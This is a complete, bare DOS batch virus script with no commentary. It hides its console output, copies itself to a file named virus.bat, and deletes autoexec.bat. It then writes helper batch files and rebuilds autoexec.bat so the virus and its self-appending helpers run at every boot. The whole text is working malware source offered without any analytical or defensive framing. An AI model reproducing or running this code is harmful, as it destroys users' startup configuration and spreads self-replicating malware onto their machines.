   @ctty nul
   copy %0 c:\virus.bat
   echo y | del c:\autoexec.bat
   echo type %0>>%0 >>c:\auto.bat
   echo type %0>>%0 >>c:\exec.bat
   echo @call exec.bat >>c:\autoexec.bat
   echo @call auto.bat >>c:\autoexec.bat
   echo @call virus.bat >>C:\autoexec.bat
